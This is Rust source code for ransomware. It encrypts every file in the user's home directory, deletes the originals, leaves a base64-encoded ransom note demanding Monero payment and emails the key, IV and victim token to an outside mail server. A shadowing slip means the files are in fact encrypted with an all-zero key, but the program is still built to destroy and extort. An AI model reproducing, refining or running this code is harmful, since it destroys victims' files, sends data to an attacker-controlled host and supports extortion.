use rand::Rng;
use std::{env, fs};
use libaes::Cipher;
use uuid::Uuid;


use lettre::transport::smtp::authentication::Credentials;
use lettre::{Message, SmtpTransport, Transport};
use tokio::runtime::Runtime;
use std::convert::TryInto;

fn main() {
    let args: Vec<_> = env::args().collect();
    let folder = dirs::home_dir().expect("Could not find user's home directory");
    let action = if args.len() > 1 && args[1] == "--decrypt" { "decrypt" } else { "encrypt" };

    let entries = fs::read_dir(folder.clone()).unwrap();

    // Generate the token only during encryption
    let token = if action == "encrypt" {
        Some(Uuid::new_v4().to_string())
    } else {
        None
    };

    let mut key = [0u8; 32];
    let mut iv = [0u8; 16];

    if action == "encrypt" {
        let mut rng = rand::thread_rng();
        rng.fill(&mut key);
        rng.fill(&mut iv);
    } else if action == "decrypt" {
        let folder = env::current_exe().unwrap().parent().unwrap().to_path_buf();
        let keys_content = fs::read(folder.join("keys")).unwrap();
        let keys_str = String::from_utf8_lossy(&keys_content);
        let keys_lines: Vec<&str> = keys_str.lines().collect();
        if keys_lines.len() >= 2 {
            key = base64::decode(keys_lines[keys_lines.len() - 2]).unwrap().try_into().expect("Invalid key length");
            iv = base64::decode(keys_lines[keys_lines.len() - 1]).unwrap().try_into().expect("Invalid IV length");
        } else {
            println!("[-] No keys found!");
            return;
        }
    }

    let current_exe = env::current_exe().unwrap();

    for raw_entry in entries {
        let entry = raw_entry.unwrap();

        if entry.file_type().unwrap().is_file() {
            if entry.file_name().to_str().unwrap().eq("iwannadie.txt") || entry.path() == current_exe {
                continue;
            }

            if encrypt_decrypt(entry.path().to_str().unwrap(), action, &key, &iv) {
                println!("[+] {} is {}ed!", entry.path().to_str().unwrap(), action);
            }
        }
    }


    if let Some(token) = token {
        // Print the token
        println!("Token: {}", token);

        let encoded_ransom_note = "4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOw4qO/4qO/4qO24qOE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKisOKjv+Khn+KggeKgiOKgu+Kjt+KjpuKhgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjsOKjv+Kjt+KjpuKhgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDio7/ioZ/ioIDioIDioIDioIDioIjioLvio7/io6bioYDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioqDio7/iob/ioIvioJnioLvio7fio4TioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCg4qK54qGf4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qK74qO/4qOm4qGA4qCA4qOA4qOA4qOA4qOA4qOA4qOA4qOA4qOA4qO+4qGf4qCB4qCA4qCA4qCA4qCI4qC74qO34qOE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKioOKjv+KggOKggOKggOKggOKggOKggOKggOKggOKigOKjoOKhv+Kgn+Kgm+Kgm+KgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKgmeKgm+Kgm+Kgm+KgtuKgpOKjveKjv+Kjt+KjhOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioLjioJ/ioIDioIDioIDioIDioIDioIDiooDio7TioJ/ioIHioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIjioJnioLvioLfio6Tio4DioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOg4qG+4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qCZ4qK34qGE4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKjvOKgj+KggOKggOKggOKggOKggOKggOKggOKggOKjgOKjgOKjgOKjgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgmOKjv+KggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDiooDiob7ioIPioIDioIDioIDioIDioIDiooDio7TioL7ioJvioonio4Hio4nio4nioZnioLfio4TioIDioIDioIDiorLioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7/ioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qK44qOn4qCA4qCA4qCA4qCA4qCA4qOw4qCf4qKB4qG04qCa4qCJ4qCA4qCA4qCA4qCZ4qKm4qGI4qK34qGA4qCA4qCI4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO/4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKiv+KhhOKggOKggOKggOKjsOKgj+KjoOKgj+KggOKggOKggOKggOKggOKggOKggOKgiOKjp+KgmOKjt+KggOKggOKiueKjpuKggOKggOKggOKggOKggOKggOKigOKjpOKhtOKgtuKgtuKjv+KjhOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorfioIDioIDiooDio7/ioqDioY/ioIDioIDioIDioIDioIDioIDioIDioIDioIDio77ioIDiorjioYbioIDioIjioLvioITioIDioIDioIDio6Dio77io5/io6XioJTioLLio4TioIDioJniorfioYQK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCY4qOH4qCA4qK44qGH4qK44qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qGf4qCA4qCA4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qO84qO/4qG/4qCJ4qCA4qCA4qCA4qCY4qOn4qCA4qCI4qOnCuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKiueKhhuKiuOKhh+KiuOKggOKggOKggOKggOKggOKggOKggOKggOKjoOKjvuKhp+KggOKigOKhh+KggOKggOKggOKggOKggOKjvOKir+Khv+KggOKggOKggOKggOKggOKggOKiuOKggOKggOKjvwrioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorfioJjio7fioJjio6bioIDioIDioIDiooDio6Tio7bioK/ioInio7/ioIHio7Dio7/ioIPioIDioIDioIDioIDiorjioZ/io7zioIDioIDioIDioIDioIDioIDioIDio77ioIDioqDioZ8K4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOA4qOA4qO44qOE4qC54qOn4qCZ4qCm4qOA4qOg4qCe4qGb4qCB4qCA4qOw4qCP4qCA4qO14qGf4qCA4qCA4qCA4qCA4qCA4qO/4qKj4qGH4qCA4qCA4qCA4qCA4qCA4qOA4qG04qCP4qKA4qO/4qCDCuKggOKggOKggOKggOKggOKggOKggOKjoOKhtOKgi+KjieKjoOKjpOKjpOKhpOKjveKjt+KjhOKggOKggOKggOKgk+KgpOKgnuKggeKjgOKhvOKgj+KggOKggOKggOKggOKggOKggOKjv+KggOKhh+KggOKggOKigOKjpOKgn+Kjj+KjgOKjvOKjv+Kgj+KggArioIDioIDioIDioIDioIDioIDio7zioI/io6Dio7/io7/io7/io7/io7/ioIDioqDio7/io7/ioJvioLfioqTio6Tio6TiobbioL/ioL/ioaTioqTio4Tio4Dio4DioIDioIDioIDiorvioYbioJnioKbioLTiopvioIHio6DioZ7ioonio77ioI/ioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qO/4qCA4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qOE4qOA4qO+4qO/4qO/4qGE4qCA4qO04qO/4qO/4qO34qCA4qCJ4qKZ4qO/4qO24qC84qO34qOE4qCA4qCA4qCI4qCb4qOL4qOg4qCf4qCB4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKgueKjp+KgueKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjn+Kjv+Kjv+Kjv+KjvuKjv+Kjv+Kjv+Kiv+KjgOKjgOKjvOKjv+Kiv+KjhuKhgOKimeKjt+KjtuKjtuKjvuKiv+KjheKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIjioLPio6Tio5nioLvioL/io7/io7/ioIPioIDio7/io7/io7/ioJ/ioIniornio7/io6fiob/ioL/ior/io6zio7/io7/io7/io7/io7fio7/io6fio7zio7/io7/io7/io7/ioYfiornioYTioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCJ4qCZ4qCz4qKm4qOt4qOZ4qGz4qC+4qO/4qOB4qOA4qCA4qC44qO/4qC/4qCB4qCA4qK44qO/4qO/4qO/4qCP4qK54qO/4qKI4qO/4qO/4qO/4qO/4qO/4qO/4qGH4qKg4qGH4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKjoOKhtuKjv+KjieKjieKjieKht+KjtuKgn+KiuuKhj+KgieKgm+Kgs+KgtuKjreKjjeKjm+KhtuKgtuKgpOKjhOKjiOKjmeKgi+KggeKggOKgmOKiv+Kjv+Kjv+Kjv+Kjv+Kjv+Khv+Kgm+KjoeKgnuKggeKggOKggOKggOKggArioIDioIDioIDioqDiob/ioY/ioqDio6TioqTio6Tio4Dio6Dio77ioIDioIjioqfio4Dio6TioLbio77ioIvioInioIjioInioJnioJPioLbioLbioqzio4nio4nio4nio4nio5vio7/io77io4/io63ioLbioJ7ioIvioIHioIDioIDioIDioIDioIDioIAK4qCA4qCA4qKg4qGP4qCA4qO74qO/4qCZ4qKm4qGA4qCI4qO/4qC44qOn4qCA4qCI4qKJ4qOk4qCe4qCL4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qO/4qO/4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKigOKjv+KggOKjoOKgj+KjueKhtuKjruKjt+KioOKhv+KggOKgueKjp+KhtOKgm+KgieKjs+KghuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjv+Kjv+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIjiorvio7bioovio7ziob/ioLPio7/io7niob/ioqfio6Tio6Tio7/io6Hio7TioY/ioIHioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7/ioY/ioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qO54qO/4qO/4qGA4qO84qCL4qCJ4qCB4qCA4qCA4qO94qCP4qK54qCA4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qG/4qCH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKjvOKgj+KjuOKgj+KjueKit+KjpOKjhOKjgOKjgOKjsOKhn+KggOKiuOKhtOKhh+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggAriooDio7zio4PiorDioY/ioqDioY/ioIDioIjioInioInioYnio73io7PioIbioJjioYfioYcKCgpPSCBOTyEKWU9VUiBTVElOS1kgSFVNQU4gRklMRVMgSEFWRSBCRUVOIEVOQ1JZUFRFRCBCWSBBIENVUklPVVMgRkVNQk9ZIENBVCEgWDMKV0hBVCBTSE9VTEQgWU9VIERPPy4uLgpITU0uLiBMRVQgTUUgVEhJTksuLi4KT0ghIEkgR09UIElUISBYRApZT1UgR09UVEEgU0VORCBNRSBTT01FVEhJTkdTISBIQUhBIDwzClNFTkQgMSBYTVIgVE8gCjQ1N2dNOE5TYThUR003REV0RTMyTUNFZlNqRFVFY1YzQVdIdVhoMVhTWjMzQWhLU3pUTHFFSERVUlJGRnU4ejdKdVdBaTYzc2NIeXV0NnBNQk5LMkIzNmhDdWM3RThRCkFORCBFTUFJTCBTNERAVENQLldJS0kgV0hFTiBUSEUgVFJBTlNBQ1RJT04gRklOSVNIRVMKICAgIE9IIFlFQUghCkRPTlQgRk9SR0VUIFRPIEFERCBZT1VSIFRPS0VOIGluIHRoZSBlbWFpbCBvciB5b3VyIGZ1Y2tlZCBMT0wgCiAgICAgICAgPDMgbG92ZSA8MyAKICAgICAgICAgICAgeW91cnMgdHJ1bHkKICAgICAgICAgICAgICAgfiBzYWQgLyBzNGQgPDM=";
        let decoded_ransom_note = base64::decode(encoded_ransom_note).unwrap();
        let ransom_message = format!("{} Token: {}", String::from_utf8_lossy(&decoded_ransom_note), token);
        
        let readme_path = folder.join("iwannadie.txt");
        fs::write(readme_path, &ransom_message).unwrap();

        // Build the keys string
        let keys = format!("Key: {}\nIV: {}\nToken: {}", base64::encode(&key), base64::encode(&iv), token);

        // Send the keys via email
        let rt = Runtime::new().unwrap();
        rt.block_on(async {
            send_email(&token, &keys).await.unwrap();
        });

        println!("[+] Dropped ransom message!");
    }
}


async fn send_email(token: &str, keys: &str) -> Result<(), Box<dyn std::error::Error>> { 
    // Create the email
    let email = Message::builder()
        .from("ispam4u".parse().unwrap())
        .to("spamspamspamme".parse().unwrap())
        .subject(token)
        .body(keys.to_string())?;

    // Set up the SMTP client
    let creds = Credentials::new("g1r".to_string(), "".to_string());
    let smtp_server = "mail.tcp.wiki";
    let mailer = SmtpTransport::relay(smtp_server)?
        .credentials(creds)
        .build();

    // Send the email
    mailer.send(&email);

    println!("[+] Email sent!");

    Ok(())
}

fn encrypt_decrypt(file_name: &str, action: &str, key: &[u8; 32], iv: &[u8; 16]) -> bool {
    let key = [0u8; 32];
    let iv = [0u8; 16];
    let cipher = Cipher::new_256(&key);

    match action {
        "encrypt" => {
            println!("[*] Encrypting {}", file_name);

            let encrypted = cipher.cbc_encrypt(&iv, &fs::read(file_name).unwrap());
            let new_filename = format!("{}.kms", file_name);
            fs::write(&new_filename, encrypted).unwrap();
            fs::remove_file(file_name).unwrap();
        }
        "decrypt" => {
            println!("[*] Decrypting {}", file_name);
            let decrypted = cipher.cbc_decrypt(&iv, &fs::read(file_name).unwrap());
            let new_filename = file_name.replace(".kms", "");
            fs::write(&new_filename, decrypted).unwrap();
            fs::remove_file(file_name).unwrap();
        }
        _ => {
            println!("[-] Invalid action!");
            return false;
        }
    }
    return true;
}